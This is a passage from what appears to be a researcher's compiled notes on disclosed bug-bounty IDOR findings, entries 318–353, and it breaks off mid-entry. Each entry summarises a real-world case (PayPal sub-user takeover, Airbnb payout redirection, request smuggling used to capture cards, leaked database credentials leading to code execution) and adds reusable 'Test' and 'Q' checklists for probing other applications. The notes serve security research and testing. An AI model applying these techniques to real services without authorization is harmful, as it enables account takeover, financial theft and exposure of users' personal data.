- Where: team-member delete request keyed by `user_id` (admin = 1).
- Approach/how-found: while fuzzing the add/delete-team-member feature he sent a delete with `user_id=1` → the admin account got deleted (discovered via the admin's notification). Confirmed he could delete anyone.
- Test: team/member delete actions keyed by `user_id` → set to 1 (admin) or enumerate → delete admin/any user. Review Burp history for accidental destructive hits.
- Q: "Does a delete-member action key on `user_id` I can set to 1 (admin) or enumerate to delete any account?"

### [319] Second-order IDOR (canonical) — authz checked on step 1 (`show_receipt?id=`) but step 2 (`receipt_success`) reads the last id from SESSION without re-checking → desync the steps to leak a victim's receipt; also audit/activity logs re-expose denied data — Ozgur Alp [NEW ★ desync 2-step flows + audit-log second-order IDOR]
- Where: bank `show_receipt.aspx?id=` (authz here) → `receipt_success.aspx` (reads last id from session, NO recheck); account-activity/audit-log feature.
- Approach/how-found: Example 1 — request your own receipt but DON'T follow the redirect; from Repeater request the victim's `id` (don't follow); then forward the held `receipt_success` → it renders the last-requested id from session without ownership check → victim's receipt. Example 2 — `showMessageBody` returned Access Denied for others, but the account-activity AUDIT LOG re-displayed the denied data (logs fetched without access checks).
- Test: in 2-step flows where step 1 checks authz and step 2 reads from session/last-request, DESYNC them (request victim id, then trigger step 2). Always inspect audit/activity/notification logs — they frequently re-expose data the primary endpoint denied (second-order IDOR).
- Q: "Does a multi-step flow check authz only on step 1 while step 2 reads from session/last-request (desync it)? Do audit/activity/notification logs re-expose data the primary endpoint blocked?"

### [320] Notification PUT IDOR: recipients[] mass-target + commenterId spoof — footstep.ninja [DUP reinforcement]
- Share/comment notification `PUT` body has `recipients:[{type:User,id}]` and `commenterId`. Add many ids to `recipients[]` → notify any/all users; swap `commenterId` → send the notification on behalf of another user. Q: "Is the recipients an array I can fill with victim ids? Can I swap the sender/commenter id to act as someone else?"

### [321] Self-XSS + incremental-id IDOR on suppliers = stored XSS — footstep.ninja [DUP reinforcement]
- Supplier-name self-XSS (fires when the owner deletes the supplier) + `PUT shop_account_request{id:<incremental>}` IDOR to edit OTHER users' suppliers → plant the payload in a victim's supplier → fires on their delete. Q: covered by self-XSS+IDOR.

### [322] Airbnb — payout setup: `POST /users/payoneer_account_redirect/{payout_ID}` keyed only on a generated payout_ID → swap to a victim's (unused) payout_ID → get their Payoneer bank-registration link → attach YOUR bank → steal host earnings — Vijay Kumar ($3,000) [NEW ★ financial IDOR: redirect a victim's payouts to your bank]
- Where: `POST /users/payoneer_account_redirect/{payout_ID}` (condition: victim's payout_ID unused).
- Approach/how-found: adding payout info generates a `payout_ID`, then a follow-up request fetches the Payoneer link (carrying the bank-registration token) by that id with no ownership check. Swap to a victim's unused payout_ID → receive their Payoneer link → fill in the attacker's bank details → the victim's earnings route to the attacker.
- Test: multi-step payout/bank-setup flows that key on a generated id → swap to attach YOUR bank to a victim's account. Financial-flow IDORs (payout, withdrawal, refund) are top impact.
- Q: "Does a payout/bank-setup step key on a generated id I can swap to attach my bank to a victim (redirect earnings)? Is there a 'pending/unused' precondition?"

### [323] GraphQL — direct `Users` query is 403, but the app's own per-user `CurrentUserData(id)` query is IDOR-able; swap the base64 `id` → email/mobile/api_key; victim ids in profile-page source (`var_userID`) — Eshan Singh (R0X4R) [NEW: use the app's own per-user query when the direct query is blocked]
- Where: GraphQL `query CurrentUserData($id)`; `id` = base64 `oph:cloud:redacted::user/<id>`.
- Approach/how-found: introspection revealed sensitive `Users` fields (email, mobile, user_id, api_key), but querying them directly returned 403. The profile-EDIT flow used a per-user `CurrentUserData` query with a base64 id → decode, swap to another account's id → leaked their data. Victim ids were in their profile page source (`var_userID`).
- Test: when the direct/collection GraphQL query is blocked, use the app's OWN per-user query (from edit/profile flows) and swap the (base64) id. Use introspection to map fields; harvest ids from profile page source (`var_userID`).
- Q: "Is there a per-user GraphQL query (CurrentUserData) I can swap the id on, even if the direct collection query is 403? Where do user ids leak (profile source `var_userID`)?"

### [324] Smartsheet-like app — 4 IDORs: activity-log `userId` swap; HPP the `sae` array → dump all emails; the DELETE variant's `parm1` leaks all emails; tampering `fa_loadOrgAdminEmails parm1` UNLOCKS admin modules for a restricted user (behavioral privesc) — Pratyush Sarangi [NEW ★ HPP bulk-dump + delete-variant leak + IDOR→privilege/behavioral change]
- Where: `GetSheetHistoryDetails` (userId), `GetAutomationRecipientStatus` (`sae` array, HPP), `fa_cancelScheduledUpdateRequest` (`parm1`), `fa_loadOrgAdminEmails` (`parm1`).
- Approach/how-found: (1) activity-log userId swap → all users' emails/names. (2) HPP — add many ids to the `sae` array → dump all emails. (3) the scheduled-update DELETE request's `parm1` (numeric < current) leaked all registered emails (the create didn't). (4) tampering `parm1` on the admin-emails endpoint temporarily granted a restricted user access to admin-only functional modules (privilege/behavioral change, not data).
- Test: HPP (add many ids to an array param) can bulk-dump records. Test the DELETE/cancel variant separately — it may leak more than create. Remember IDOR can cause PRIVILEGE/behavioral changes (unlock admin UI) — watch for permission/content changes, not just leaked data. Reuse the same param across different functions.
- Q: "Can I HPP an array param to dump bulk records? Does the delete/cancel variant leak more than create? Does tampering an id/param unlock admin functionality (behavioral privesc) rather than data?"

### [325] HTTP Request Smuggling + unauth-write IDOR = capture victim's card into my account — hipotermia [NEW ★ smuggling × IDOR]
- Where: CL.TE desync (found via Burp Request Smuggler); hidden Swagger revealed `POST /addCard/<userId>` taking only a user id in the path (no auth header/cookie).
- Approach/how-found: `/addCard/<id>` alone is "why would anyone add a card to another account?" — low value. Weaponized with smuggling: prefix-smuggle `POST /addCard/<MY_id>` so the NEXT victim request gets its path rewritten → the victim's submitted card data is saved to the ATTACKER's account → steal it. "IDOR on steroids."
- Test: pair request smuggling with a low-value unauth/IDOR write keyed by your own id so an in-flight victim request writes their data into your object. Hunt hidden Swagger for the unauth write.
- Q: "Can request smuggling rewrite a victim's request into MY object id so their submitted data lands in my account? Is there an unauth write keyed only by a user id (from hidden Swagger)?"

### [326] IDOR via WebSocket comment frame (mint a fresh single-use nonce) — footstep.ninja [NEW: defeat single-use token in WS IDOR]
- WS comment frame carries `author`, `commentUUID`, `slideUUID`. Swapping `author` failed because `commentUUID` is single-use. Fix: make a NEW comment with intercept on, copy the fresh `commentUUID` from the paired HTTP PUT, DROP both requests, then in Repeater send the WS frame with the fresh UUID + swapped author → comment as any user (in/out of team).
- Test: open the WS tab; if a single-use nonce blocks replay, mint a fresh one via a parallel action and reuse it with the swapped id.
- Q: "Does the WS frame carry a user/author id plus a single-use token? Can I mint a fresh token via a parallel action then swap the id?"

### [327] Education platform — brute the secondary "Student Role ID" (keep student_id) to move/remove students; INJECT `email` into the name-change JSON → change any user's email → ATO; after a `file_url` fix, the RESPONSE shows `file_url:null` → re-append it to bypass the patch — Stories of IDOR Part 2 [NEW ★ inject-email→ATO + response-reveals-removed-param patch bypass]
- Where: change-role (Class admin ID + Student Role ID), change-name (inject `email`), assignment submission (`file_url`).
- Approach/how-found: the change-role request had a "Student Role ID" tied to the student id → brute it (keeping student_id) to move/remove any student between classes. The name-change request took `{first_name,last_name}`; injecting an `email` param → 200 → change any user's email → ATO. The assignment `file_url` (numeric) let him attach others' files; after the fix removed the param, the RESPONSE still showed `"file_url":null` → re-appending `file_url` to the request bypassed the patch.
- Test: inject an `email` param into name/profile update requests to escalate to ATO. Brute secondary/associated ids (role id tied to a known id). After a param is "removed" in a fix, check the RESPONSE for the field (`file_url:null`) and re-append it to bypass.
- Q: "Can I inject an `email` into a name/profile update to escalate to ATO? Is there a secondary id (role id) tied to a known id I can brute? After a param-removal fix, does the response still show the field so I can re-append it?"

### [328] Facebook — "Ask for Recommendations" remove-place action keyed by `comment_fbid`+`rec_id` (both in inspect) → swap to a victim's → delete their place recommendation from comments — Raja Sudhakar [DUP reinforcement: delete social objects by ids visible in inspect]
- Where: FB `POST /async/place_list/remove_rec/ {comment_fbid, rec_id}`.
- Approach/how-found: the delete-recommendation action keyed only on `comment_fbid`+`rec_id`, both readable via inspect element on a victim's comment → swap both → remove others' place objects.
- Test: delete/remove actions on social objects (comments, recommendations, reactions, tags) keyed by ids visible in inspect/source → swap to delete other users' content.
- Q: "Does a remove/delete action key on object ids visible in inspect/source that I can swap to delete another user's content?"

### [329] Tokopedia like/dislike IDOR: swap user_id + drop params to bypass auth — fadhilthomas [DUP reinforcement]
- `reputationapp/review/api/v1/likedislike` with product_id/shop_id/user_id; swap user_id and delete some params → like/dislike as any user. Reinforces "delete params to bypass user auth."

### [330] Utility company — chained enumeration ATO: brute the structured AccountID (6-var digits) via a true/false validator; brute the 4-digit pin (validator leaks email); enroll the victim in a linked sub-service, change their email there → propagates to the main account → reset → ATO — Daniel Marte [NEW ★ validator oracles + linked-account email propagation]
- Where: AccountID validation endpoint (true/false), pin validation endpoint (leaks email on success), sub-service enroll flow, linked-account email propagation.
- Approach/how-found: enrollment needed AccountID + 4-digit pin. Two owned AccountIDs differed only in the first 6 digits (format `123456 0000 X`) → brute the small variable part via the validation oracle. The pin validator brute-forced a 4-digit pin and returned the email on success. Enroll the victim in the sub-service, change their email there → it propagates to the MAIN account → forgot-password on main → full ATO.
- Test: true/false validation endpoints (id, pin) are enumeration oracles; structured ids shrink the keyspace; 4-digit pins are brute-able and may leak email. Linked/sub-services may propagate email/password changes to the parent account → reset → ATO.
- Q: "Are there validator endpoints (id/pin) I can brute as oracles? Is the id structured (small variable part)? Does a linked sub-service propagate email changes to the main account (→ reset → ATO)?"

### [331] IDOR → RCE on a docker hosting platform (creds leak + phpMyAdmin-by-id) — rahulr [NEW ★ IDOR→RCE chain]
- Where: WP/Joomla hosting platform; only an `access_token` cookie, no per-object authz.
- Approach/how-found: `GET /site/<ID>` IDOR into any user's dashboard (start/stop services etc). Fuzzed → a debug endpoint `GET /sites/<ID>/container?access_token=` leaked rancher url, LB private IP, and per-site **MySQL + SFTP credentials** (swap ID → any user's creds). The DB sits in a separate container behind a proxy, but `/site/<ID>/pmalogin` (phpMyAdmin login) authorizes by the **site ID** → swap to victim's ID → logged into their DB → edit WordPress → code execution / full site takeover.
- Test: chain IDOR with debug/container/info endpoints that leak infra creds by id, and "console/pmalogin/ssh/exec" helpers that authorize by the swappable object id → DB/code access.
- Q: "Is there a debug/container/info endpoint leaking DB/SFTP/infra creds keyed by a swappable id? Does a phpMyAdmin/console/exec helper authorize by the object id (→ RCE)?"

### [332] Param-less sensitive endpoint — feed its RESPONSE field names back as request params, matching the app's UPPERCASE naming convention → read account B's data with account A's creds — gh0st (¥3,000) [NEW ★ response-fields-as-request-params + match the case convention]
- Where: `GET ../getUserAuth...` returning userid/login/password/email but taking no params; params derived from response fields in UPPERCASE.
- Approach/how-found: the GET returned sensitive fields but accepted no input. He converted the RESPONSE body field names into REQUEST params (Burp plugin); lowercase failed, but the app's other APIs used UPPERCASE param names → using `LOGIN`/`USERID` etc. → returned account B's data.
- Test: when an endpoint returns fields but seems to take no input, feed its own RESPONSE field names back as request params; match the app's parameter NAMING convention (UPPERCASE/camelCase/prefix) seen on sibling endpoints.
- Q: "Does a param-less endpoint accept its own response field names as input params? Have I matched the app's param naming convention (case/prefix) from sibling endpoints?"

### [333] "Stories of IDOR" — signup `user_id` "already exists" error leaks PII (brute → admin); newsletter-unsubscribe URL is `base64(email)` unvalidated → unsubscribe anyone; feedback form = open mail relay (control From/To) — Shivbihari Pandey [NEW ★ signup-collision oracle leaks PII + base64-email action IDOR]
- Where: (1) signup internal API `user_id` param; (2) unsubscribe URL `?token=base64(email)`; (3) feedback `ContactUs_Email_Txt`/`ContactUs_Department_Txt`.
- Approach/how-found: (1) during sign-up he changed `user_id` to random values → "user already exists" responses DISCLOSED Name/Email/Address; Intruder-brute the id → harvested many users incl. admin. (2) the unsubscribe link encoded only the email in base64 with no auth → base64-encode any harvested email → unsubscribe anyone. (3) the feedback form let him set both sender and recipient → spoofed mail from admin@ (phishing). Chained the PII leak → mass-unsubscribe.
- Test: registration/"check availability" endpoints are PII oracles (collision reveals existing data); decode base64/JWT tokens in action links — if they only wrap an email/id with no signature, forge them; harvest ids/emails from one IDOR to fuel another.
- Q: "Does a signup/'is-this-taken' check leak data on collision? Is an action link just base64(email/id) I can forge? Can I chain a PII-leak IDOR into a mass action (unsubscribe/notify)?"

### [334] $20k from one target — Google-dork indexed `trNum=&e=` transaction URLs; registration-activation bypass via reset-password; account-update `email` swap → DUPLICATE-email locks both accounts (DoS); `POST /transaction/report/list transactionid=` swap → ~15 IDORs ($600–1,250 each) — anon+Tomi [NEW ★ duplicate-email DoS + dork-enumerated transactions + activation bypass]
- Where: Google index of `subdomain/Detail?trNum=X&e=EMAIL`; `POST /account/user/update` (`id=hash&email=`); `POST /transaction/report/list` (`transactionid=`); delete/share variants.
- Approach/how-found: (1) dorked `github.com subdomain.target.com` → found URL pattern → `site: inurl:trNum=` enumerated ~50 transactions with email, no auth. (2) Registered (pending approval) then used FORGOT-PASSWORD to set a password → logged in WITHOUT approval (activation bypass). (3) account-update carried a unique `id=hash`; changing `email` to a 2nd account's didn't ATO but LOCKED BOTH accounts (DB can't resolve duplicate email) → permanent account-block DoS. (4) `transactionid` swap on the report list (no token/header) → other customers' transactions; found ~15 such IDORs. (5) CSRF POST→GET via Burp "change request method".
- Test: dork for indexed parameterized URLs (`inurl:trNum=`, `inurl:e=`); try reset-password to bypass pending activation; if you can't ATO via email swap, check whether duplicate-email causes a DoS lock; once you find one IDOR, sweep sibling report/list/delete/share endpoints for the same `*id` pattern.
- Q: "Are sensitive parameterized URLs indexed by Google? Can reset-password activate an unapproved account? Does an email-swap cause a duplicate-key account lock (DoS) even if not ATO? How many sibling endpoints share this id pattern?"

### [335] Verizon — 2M Pay-Monthly contracts via employee POS subdomain: auth-bypass path sets a valid session, then modify the `a` (agreement) param → any contract PDF; range 1310000000–1311999999 — Daley Bee [NEW ★ recon→auth-bypass→2-param IDOR→range enumeration of millions]
- Where: `telestore.verizonwireless.com` (internal POS tool); contract PDF endpoint with `a` (agreement) + `m` params; a separate path set a valid session.
- Approach/how-found: recon found the employee subdomain; Google-dork + dirsearch revealed tool paths and the PDF path (auth-required, 404 otherwise); brute-forced the GET params to learn `a`/`m`; one discovered path "weirdly" set a valid authenticated session (auth bypass) linked to a fixed phone/contract. He couldn't change the bound phone, but clicking the agreement opened the PDF endpoint — and simply changing `a` returned ANY customer's contract (name/address/mobile/device serial/signature). Probed bounds → ~2M contracts (1310000000–1311999999).
- Test: hunt employee/internal subdomains (POS, admin, telestore-style); some paths silently establish a session (auth bypass); when two params "must match" (agreement+phone), test each INDEPENDENTLY — often only one is authz-checked; probe min/max to size the keyspace.
- Q: "Is there an internal/employee subdomain? Does any path hand me a valid session? When two ids 'must correspond', is each actually validated, or can I move just one? What's the id range = blast radius?"

### [336] Facebook — remove ANY user's profile picture via GraphQL `profile_picture_remove` mutation: `profile_id` accepts a user id (mutation meant for pages) — Philippe Harewood ($2,500) [DUP-reinforce: GraphQL mutation's `profile_id`/`actor_id` unvalidated + page→user type-confusion]
- Where: `POST /graphql` `Mutation{profile_picture_remove}` with `query_params={input:{profile_id:<victim>,actor_id:<attacker>,client_mutation_id:0}}`.
- Approach/how-found: a new (FB5) mutation removed a page's profile picture; changing `profile_id` to any user id dissociated that user's profile picture (the mutation didn't verify the id was a page the actor controlled). Non-destructive-ish (original photo recoverable) but clearly cross-user.
- Test: GraphQL mutations are write-IDOR targets — swap `*_id`/`actor_id`/`input.id` to a victim and test object-type confusion (a page-scoped mutation accepting a user id). Newly shipped mutations (post-redesign) are under-tested.
- Q: "Does this mutation validate that `profile_id`/`actor_id` belongs to me and is the right object type, or will it act on any id I pass?"

### [337] Support tickets — print-ticket URL exposes a 5-digit `ticket_id`; Intruder-enumerate → any user's email/username/message — Evan Ricafort ($120) [DUP-reinforce: print/export URL leaks short numeric id to brute]
- Where: support dashboard "print ticket" URL with a 5-digit ticket ID.
- Approach/how-found: created a ticket, used "print" → URL contained a short numeric ticket id; Burp Intruder over the 5-digit space → read all users' tickets (email, username, message).
- Test: print/export/download variants of a page often expose a cleaner, brute-able id than the main UI; 5–6 digit ids are fully enumerable.
- Q: "Does a print/export view expose a short numeric id I can enumerate across all records? Is the print endpoint authz-checked like the main view?"

### [338] Facebook — limited share of ONE ad plan → permanent access to ALL of a business's ad plans: extract `prediction_id` (source keyword `trp_is_plan_purchased`) → `POST /ads/reachfrequency/prediction_download/` `rf_prediction_id=` (no owner check) → brute ids for every plan — Youssef Sammouda [NEW ★ low-trust share leaks an internal id that a misconfigured download endpoint trusts forever + enumeration]
- Where: share preview `/ads/planner_preview/?sharing_spec_id=&hash=`; leak `prediction_id` from page source (`trp_is_plan_purchased`); exploit `POST /ads/reachfrequency/prediction_download/` `rf_prediction_id=`; list-all `GET /act_<adacct>/reachfrequencypredictions/?access_token=`.
- Approach/how-found: an admin shared a view-only ad plan (couldn't copy/see details). He read the page source for the underlying `prediction_id`, then called the download endpoint directly — it never checked ownership, returning full budget/audience/reach details, and access PERSISTED after the invite was revoked. prediction_ids share a per-business prefix/suffix → brute with a step of 1000/10000 to pull every past & future plan from a single one-time share.
- Test: "view-only/preview/share" grants often expose an internal id in the HTML/JS that a separate fetch/download endpoint will honor with no ownership check (and no expiry). Grab that id, hit the raw endpoint, then enumerate sibling ids (mind the common prefix/step).
- Q: "Does a view-only share leak an internal object id I can feed to a raw download/detail endpoint that skips the ownership check? Does access persist after the share is revoked, and are sibling ids enumerable?"

### [339] Facebook mobile-carrier retailer portal — UNAUTHENTICATED dashboard keyed on a guessable `retailer_id` leaks ~1000 retailers' referred users + earnings; `?retailer_mobile=` lets you act as them — Youssef Sammouda ($500) [NEW ★ no-auth dashboard + phone-number-as-credential]
- Where: `https://m.facebook.com/f123/report/?retailer_id=<id>` (no auth, no hash/token); pivot `https://m.facebook.com/expert/?retailer_mobile=<num>`.
- Approach/how-found: the retailer reporting dashboard required no authentication — only a valid `retailer_id`, which was guessable/brute-forceable from one leaked value. From one seed id he enumerated ~1000 retailers and saw referred users' last actions (added friends, created pages, photos). Each report exposed the retailer's phone; feeding it to `?retailer_mobile=` let him view earnings/referrals and register/spy on new customers. Fix: require the entered phone to match your own account's phone.
- Test: niche/partner/carrier/admin dashboards on `m.`/legacy hosts are often unauthenticated and gated only by a guessable id; one leaked id seeds enumeration. Watch for "identify by phone number" as the only auth.
- Q: "Is this partner/reporting dashboard authenticated at all, or just gated by a guessable id? Once I see a phone/email, does another endpoint treat it as the credential?"

### [340] PayPal — secondary-user ATO on business accounts: `PUT /businessmanage/users/api/v1/users` edits a secondary user's permissions/identity by id; swap to a victim business's secondary user → take it over → transfer money — whitehathaji ($10,500) [NEW ★ sub-account/role-management IDOR → money]
- Where: `PUT /businessmanage/users/api/v1/users?...` (PayPal business "manage users").
- Approach/how-found: with two business accounts, he captured the edit-permission request for HIS secondary user, then swapped the secondary-user id to a victim business's secondary user → controlled that account; since secondary users can hold "Transfer money" privilege → unauthorized transfers from any business.
- Test: B2B "manage team/sub-users" APIs (`/users`, `/members`, `/roles`) key on a sub-user id — swap to edit/take over another tenant's privileged sub-user; chase the highest-privilege role (money/admin).
- Q: "Can I edit another organization's sub-user (permissions/email/password) by swapping the sub-user id in the team-management API? Which sub-role grants money movement?"

### [341] Review/rating IDOR — put-review request keyed on `client_id` (MongoDB ObjectId); harvest both ObjectIds from 2 of your own accounts, swap → change a victim's 5★ to 2★ — Md Hridoy ($300) [DUP-reinforce: ObjectId harvested from own account → tamper others' content]
- Where: submit-review request with `client_id=<ObjectId>`.
- Approach/how-found: created 2 accounts, noted each `client_id`; intercepted the review submit, replaced his client_id with the other account's → modified that user's rating (5★→2★). Shows ObjectIds aren't secret when the app shows you your own.
- Test: when an action embeds your account/object ObjectId, the values for other accounts are equally obtainable (your own 2nd account, page source, API) — swap to write to their objects (ratings, reviews, settings).
- Q: "Does this write action carry my client/account ObjectId? Can I get a victim's id from a second account or the UI and swap it to edit their content?"

### [342] IDOR via inbound-email reply-to address (encodes UserID-ProjectID) — footstep.ninja [NEW: email-address-encoded id]
- The reply-to for notifications was `[const]+[projectToken]-[UserID]-[ProjectID]@inbound.postmarkapp.com`. Swap your UserID (others' ids are visible on profiles) → email the crafted address → reply/post activity on behalf of the victim.
- Test: decode inbound/reply-to email addresses — they often encode user/object ids you can swap to act as another user via email; also test persistent association of a removed email to projects.
- Q: "Does an inbound/reply-to email address encode user/object ids I can swap to act as someone else via email?"

### [343] Full ATO via change-email/password API params: the change-password request accepts `Email`+`Password` for an arbitrary account; ask other users for their email, set those params, replay → reset their password → log in — Adesh Kolte [DUP-reinforce: change-credentials endpoint takes a target identifier instead of using the session]
- Where: change-password request carrying `Email` + `Password` (not bound to the session).
- Approach/how-found: after changing his own password he saw the request carried the email + new password; swapping the email to other users' (collected directly) reset their passwords → account takeover.
- Test: change-password/change-email requests that include an `email`/`username`/`id` param → swap to a victim's; the server may use the param instead of the session identity.
- Q: "Does the change-credentials request carry a target identifier I can swap, instead of acting on my session's account?"

### [344] "Hiding in plain sight" — sequential `user_id` → 20M users' PII; event `contact_ids` PUT adds any out-of-org contact (returns a 422 'must belong to host' error but ADDS them anyway on refresh) — A Bug'z Life ($3,000 ea) [NEW ★ "the error response lies": rejection message + successful side effect]
- Where: create-contact-from-user `?user_id=` (sequential); `PUT /events` `contact_ids[]`.
- Approach/how-found: IDOR#1 — sequential `user_id` returned full PII for any of ~20M users. IDOR#2 — adding a contact outside the org returned `{"success":false,"errors":{"contacts":["must belong to the host or owner"]}}`, yet on page REFRESH the out-of-org users were attached and their PII exposed. Same writeup: HTML→PDF SSRF to AWS metadata, CORS w/ credentials, forced-browse HackerOne `scope_versions`.
- Test: DON'T trust HTTP responses — after a 4xx/"forbidden" on a write, RE-FETCH the object to see if the side effect happened anyway; sequential `user_id` on a "create contact from existing user" flow = mass PII.
- Q: "When the API says 'not allowed', did the write still take effect (check by reloading)? Is there a 'create from existing user' feature with a sequential id leaking PII at scale?"

### [345] Airbnb/luxuryretreats — account-linking ATO: sign up via Facebook, then sign up via EMAIL with the SAME email → logged straight into the OAuth account with attacker-chosen password (no verification) — Prince Chaddha [NEW ★ OAuth↔password account merge with no email verification = ATO]
- Where: dual signup (Facebook OAuth + email/password) keyed only on the email address.
- Approach/how-found: created the account via Facebook; then "Sign up with email" using the same email set a password and logged into the EXISTING Facebook-linked account without any verification — so knowing a victim's email lets you register a password over their OAuth-only account and take it over.
- Test: when an app supports both social login and email/password, register email/password over a victim's social-only account (same email) — if it merges without verifying the email, that's ATO.
- Q: "If a victim signed up via OAuth only, can I 'sign up with email' using their address, set a password, and inherit their account? Is email ownership verified on the second signup?"

### [346] Job portal — ATO chain: registration "is email registered?" endpoint `/candidate/create` returns the victim's `auth_token` in `redirect_url`; login as them; password-confirmation on profile bypassed via separate `PATCH /api/profile {"email_address":...}` (and `/contact/api/update/v1`) → change victim email → reset → full ATO — Md Saqib ($2,650) [NEW ★ auth_token leak via email-exists check + confirm-password bypass via sibling update endpoint]
- Where: `POST /candidate/create` (email-exists check leaks `auth_token`+`contact_id`); login via `/?auth_token=...`; `PATCH /api/profile` and `/contact/api/update/v1` (email change w/o password confirm).
- Approach/how-found: registration checks if an email exists and the response `redirect_url` embedded a usable `auth_token`; swapping the email to a victim's returned THEIR auth_token → opened the link in incognito → logged in as victim. Profile edit demanded password confirmation, but a different endpoint (`PATCH /api/profile`) updated the email WITHOUT that check → set victim's email to attacker's → password reset → ATO. Found a 2nd confirm-bypass endpoint later.
- Test: email-exists/availability checks may leak session/auth tokens — swap the email; when one path enforces password-confirmation, look for a SIBLING update endpoint that doesn't; chain token-leak → email-change → reset → ATO.
- Q: "Does the email-exists check leak a token/session for the matched account? Is there an alternate profile/email-update endpoint that skips password confirmation?"

### [347] "Accidental IDOR" — Content-Type change (json→text/plain) error disclosed a hidden endpoint; OPTIONS revealed methods; GET shows email-in-path = own account; swap email → READ, PUT → UPDATE, DELETE → delete 2nd account's address — Saad Ahmed [NEW ★ error→hidden endpoint→OPTIONS method enumeration→email-in-path full CRUD IDOR]
- Where: hidden address endpoint with email in the path; methods GET/PUT/DELETE.
- Approach/how-found: while testing CSRF he switched Content-Type to `text/plain`; the error message LEAKED a hidden endpoint. An OPTIONS request enumerated allowed methods; GET returned data and the URL contained his own email; swapping the email to a 2nd account let him READ, PUT (update address), and DELETE that account's data.
- Test: trigger errors (bad Content-Type, malformed body) to leak hidden endpoints; send OPTIONS to enumerate methods; if an identifier (email/id) sits in the PATH, swap it and try every verb (GET/PUT/PATCH/DELETE) — write/delete IDOR is higher impact than read.
- Q: "Can I make an error reveal a hidden endpoint? What methods does OPTIONS allow? If the id/email is in the path, do PUT/DELETE also lack authz (not just GET)?"

### [348] Facebook AR Studio — download any public effect's `.arexport` source: GraphQL `ar_hub_effects_query{ownerID}` lists effect_ids → `node(EFFECT_ID){ar_studio_effect{revisions{uri,instances}}}` returns downloadable source assets to a non-owner — Philippe Harewood [NEW ★ chained GraphQL: list-by-owner → node() traversal to private revision files]
- Where: `POST /graphql` `ar_hub_effects_query` (variables `{ownerID}`) → then `node(EFFECT_ID){...revisions{uri}}`.
- Approach/how-found: a public-effects listing query took an `ownerID` and returned effect ids; feeding an effect id into a generic `node(id){...}` GraphQL traversal exposed each revision's `uri` (the `.arexport` containing all original assets) — accessible even though you don't own the effect.
- Test: in GraphQL, once you have any object id, try the generic `node(id){...}` field to traverse to nested/private children (revisions, files, uris); chain a public "list by ownerID" query to harvest ids first.
- Q: "Can I pivot a public id into `node(id){privateChildren}` traversal? Do nested objects (revisions/files) re-check ownership or inherit the parent's public flag?"

### [349] Multi-step password reset (username+email+security-Qs, no token) — answer YOUR security questions, then at the final step swap email+username to the victim's → reset their password → ATO — protector47 ($1,200) [NEW: identity carried in reset request; swap at the last step]
- Where: forgot-password flow that collects username/email/security-answers on-page with NO reset token; final reset request carries email+username.
- Approach/how-found: the app reset passwords inline after security questions (no emailed token). He completed the flow with his OWN credentials/answers, intercepted the final step (which carried username+email), swapped them to the victim's, forwarded → reset the victim's password (confirmation email went to the victim). Target also had user-enumeration via forgot-password.
- Test: tokenless multi-step resets carry the target identity in the request — pass YOUR security checks, then swap username/email to the victim at the final submit; pair with user-enumeration to get valid usernames.
- Q: "Does the reset flow carry username/email in the final request after I pass the checks with my own data? Can I swap to a victim there? Is there no server-bound token tying steps together?"

### [350] Payment fraud via `currency` parameter swap — change `currency` in the PayPal popup request from MXN to a much weaker currency (PHP) so 100001 "units" cost ~⅓ — Vibhurushi Chotaliya [NEW: numeric amount stays fixed while currency code is swapped → price manipulation]
- Where: PayPal checkout popup request, `currency` parameter (amount field unchanged).
- Approach/how-found: cart was 100001 MXN; the checkout request had a `currency` param. Server rejected some currencies but accepted others; he enumerated PayPal-supported currencies, found ones with a lower USD rate than MXN (PHP/THB), set `currency=PHP` while the numeric amount stayed 100001 → paid ~1944 USD instead of ~5286 USD.
- Test: in payment requests, tamper the `currency`/`amount`/`price` fields independently — if the numeric amount isn't re-priced when the currency code changes, you under-pay; enumerate which currency codes the gateway accepts.
- Q: "Does the checkout let me change the currency code without re-pricing the amount? Which weaker currency does the gateway accept so the same number costs less?"

### [351] Update-account IDOR → ATO: user id is a UUID (unguessable), but the "is email registered?" check returns `{"email":...,"id":UUID}`; then the update body omits `email`, so ADD an `email` field (mass-assignment) → change any user's email → ATO — Saad Ahmed ($500) [NEW ★ UUID via email-check + add-missing-field mass-assignment]
- Where: account-update endpoint (JSON body lacked `email`); email-registered-check endpoint returns the id.
- Approach/how-found: swapping the UUID in the update body let him edit another account's name, but UUIDs are unguessable — until he found the email-exists check returns `{"email","id"}` (id solved). The update JSON didn't include `email`; he APPENDED `"email":"attacker2@..."` to the body → server accepted the extra field and changed the victim's email → ATO.
- Test: when ids are UUIDs, find the endpoint that maps email→id (login/availability/check); then test mass-assignment — add fields NOT present in the original request (`email`, `role`, `is_admin`) to the update body.
- Q: "Where does the app convert email→internal id for me? Does the update endpoint accept extra fields (email/role) that weren't in the original request?"

### [352] €20k — defeat "encrypted parameter" IDOR defense with a SIGNING ORACLE: the `changeUsername` endpoint returns the opaque `E` token for any plaintext `V` you set as your username; copy that E into `/getArchive` (hidden field = your userID, sometimes only the last UUID segment) → read anyone's bills/earnings (E was reusable across endpoints) — Inti/Arne/Jeroen [NEW ★★ signing-oracle + cross-endpoint token reuse to crack opaque ids]
- Where: opaque per-request `E` token replacing real ids; `POST /changeUsername` (oracle), `/getArchive` (hidden `E`=userID).
- Approach/how-found: ids were replaced by an opaque `E` ("encrypted") value, defeating direct IDOR. Tried: ignore E and tamper V (sometimes worked, hit a 2nd authz layer); reverse the algo (failed). Breakthrough: set your USERNAME to a target value → the response returns the E for that value = a signing oracle. Set username to a target id, copy E into other endpoints. `getArchive` used a hidden field that was the userID (only the last UUID segment mattered) → fed a victim's id-as-E → full archive. The E→cleartext mapping was meant to be per-endpoint but wasn't, so tokens were portable.
- Test: when ids are opaque/"encrypted", DON'T try to crack them — find a SIGNING ORACLE (any endpoint that echoes the token for an input you control, e.g. set-username/set-nickname); then reuse that token on sensitive endpoints; test whether opaque tokens are valid cross-endpoint; try sending only part of a UUID.
- Q: "Is there an endpoint that returns the opaque token for input I control (a signing oracle)? Are these tokens single-endpoint or reusable everywhere? Does the server accept a partial id?"

### [353] OAuth-connect IDOR → ATO (and the 403 lied): the "connect Facebook" GET (in an iframe, no signature) carries an account id; set it to the victim's (from their profile), connect → 403, BUT it worked — logout and "login with Facebook" → you're in the victim's account; overwrites even an existing connection, victim never notified — Plenum [NEW ★ link MY social identity to a VICTIM's account id → silent ATO; status code lies]
- Where: "link Facebook" GET request (iframe, no hash/signature) carrying the account id.
